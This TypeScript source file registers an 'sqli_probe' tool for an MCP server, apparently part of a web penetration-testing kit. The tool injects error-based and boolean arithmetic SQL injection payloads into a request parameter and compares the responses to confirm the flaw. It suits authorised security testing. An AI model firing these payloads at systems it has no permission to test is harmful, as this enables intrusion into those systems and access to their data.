import { z } from 'zod'

import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'

import { buildRequestSpec, repeaterSendRaw, restoreMarker } from '../../repeater'
import { ok, err, errorMessage } from '../utils'
import { formSlotToMarker } from './ssti_probe'
import { urlSlotToMarker } from './cmd_probe'

// SQL injection probe — the cmd_probe pattern applied to a query sink.
// Fires three payloads: a bare quote (error-based: a DB error signature in the
// response proves the value reached a query unsafely) and a nonce arithmetic
// boolean pair (`zz' OR 2*3=6-- -` vs `=7`): the two responses differ ONLY if
// the server evaluated the arithmetic — a literal reflection of the payload is
// stripped from both sides before comparing, so an echo proves nothing.

export interface SqliCase {
  context: 'error' | 'bool-true' | 'bool-false'
  payload: string
}

const PRIMES = [101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157]

function randomNonce(): string {
  return 'z' + Math.random().toString(36).slice(2, 7) + 'z'
}

export function buildSqliCases(
  a = PRIMES[Math.floor(Math.random() * PRIMES.length)],
  b = PRIMES[Math.floor(Math.random() * PRIMES.length)],
  nonce = randomNonce()
): SqliCase[] {
  return [
    { context: 'error', payload: `${nonce}'` },
    { context: 'bool-true', payload: `${nonce}' OR ${a}*${b}=${a * b}-- -` },
    { context: 'bool-false', payload: `${nonce}' OR ${a}*${b}=${a * b + 1}-- -` }
  ]
}

/** DB/driver error signatures that leak into a response body. */
export const SQL_ERROR_RE =
  /(sql synta|syntax error|unclosed quotation|mysql|mariadb|postgres|\bpsql\b|sqlite|programmingerror|operationalerror|integrityerror|jdbc|odbc)/i

export interface SqliReply {
  context: string
  status: number
  body: string
  payload: string
}

export interface SqliOutcome {
  sqli: boolean
  contexts: string[]
}

// Every encoding a reflected payload may come back in; stripping all of them
// from BOTH boolean bodies means a surviving difference is server behavior.
function echoVariants(p: string): string[] {
  return [
    p,
    p.replaceAll(' ', '+'),
    encodeURIComponent(p),
    p.replaceAll("'", '%27').replaceAll(' ', '+'),
    p.replaceAll("'", '&#39;'),
    p.replaceAll("'", '&#x27;')
  ]
}

function normalized(r: SqliReply): string {
  const stripped = echoVariants(r.payload).reduce((s, v) => s.split(v).join(''), r.body)
  return `${r.status}|${stripped.replace(/\s+/g, ' ')}`
}

/** Confirmed iff a DB error signature appears, or the boolean pair differs. */
export function sqliEvaluated(replies: SqliReply[]): SqliOutcome {
  const byCtx = new Map(replies.map((r) => [r.context, r]))
  const contexts: string[] = []
  const e = byCtx.get('error')
  if (e && SQL_ERROR_RE.test(e.body)) contexts.push('error')
  const t = byCtx.get('bool-true')
  const f = byCtx.get('bool-false')
  if (t && f && normalized(t) !== normalized(f)) contexts.push('boolean')
  return { sqli: contexts.length > 0, contexts }
}

export function registerSqliProbeTools(mcp: McpServer) {
  mcp.registerTool(
    'sqli_probe',
    {
      description:
        'Confirm SQL injection at a request parameter. Fires a bare-quote payload (error-based: DB error signature in the response) and a nonce arithmetic boolean pair (`z..z\' OR 2*3=6-- -` vs `=7`): the pair is confirmed only when the two responses differ after stripping payload echoes — i.e. the server evaluated the arithmetic, an echo proves nothing. Pass param=<query or form field name> and the tool marks the slot itself. Login/search form fields are the classic carriers. A positive result is data-exfiltration class; record as critical.',
      inputSchema: {
        requestId: z.string(),
        param: z.string().optional().describe('Query or form field that carries the value (e.g. "username") — the tool marks it with § itself'),
        a: z.number().int().optional().describe('First factor (test determinism; default random prime)'),
        b: z.number().int().optional().describe('Second factor (default random prime)')
      }
    },
    async ({ requestId, param, a, b }) => {
      try {
        const base = restoreMarker(buildRequestSpec(requestId, undefined))
        if (param) {
          if (base.url.includes(`${encodeURIComponent(param)}=`)) base.url = urlSlotToMarker(base.url, param)
          else base.body = formSlotToMarker(base.body ?? '', param)
        }
        const markerIn = (s: string | undefined) => (s ?? '').includes('§')
        if (!markerIn(base.url) && !markerIn(base.body) && !Object.values(base.headers).some(markerIn)) {
          return err(
            'no injectable slot: pass param=<query or form field name> (e.g. param: "username") or stage a request with a literal § marker first'
          )
        }
        const ctype = Object.entries(base.headers).find(([k]) => k.toLowerCase() === 'content-type')?.[1] ?? ''
        const formBody = /application\/x-www-form-urlencoded/i.test(ctype)

        const cases = buildSqliCases(a, b)
        const replies: SqliReply[] = []
        const results: Array<{ context: string; status: number; preview: string }> = []
        for (const c of cases) {
          const sub = {
            url: base.url.replaceAll('§', encodeURIComponent(c.payload)),
            method: base.method,
            headers: Object.fromEntries(
              Object.entries(base.headers).map(([k, v]) => [k, v.replaceAll('§', c.payload)])
            ),
            body: base.body?.replaceAll('§', formBody ? encodeURIComponent(c.payload) : c.payload)
          }
          const r = await repeaterSendRaw(sub)
          replies.push({ context: c.context, status: r.status, body: r.body, payload: c.payload })
          const m = SQL_ERROR_RE.exec(r.body)
          results.push({
            context: c.context,
            status: r.status,
            preview: m ? r.body.slice(Math.max(0, m.index - 30), m.index + 60) : r.body.slice(0, 120)
          })
        }
        const { sqli, contexts } = sqliEvaluated(replies)
        return ok(
          JSON.stringify(
            {
              sqli,
              contexts,
              note: sqli
                ? 'SQL injection confirmed (error signature and/or boolean arithmetic differential) — data exfiltration class, record as critical.'
                : 'No DB error signature and no boolean differential; the value likely does not reach a query unsafely.',
              results
            },
            null,
            2
          )
        )
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )
}
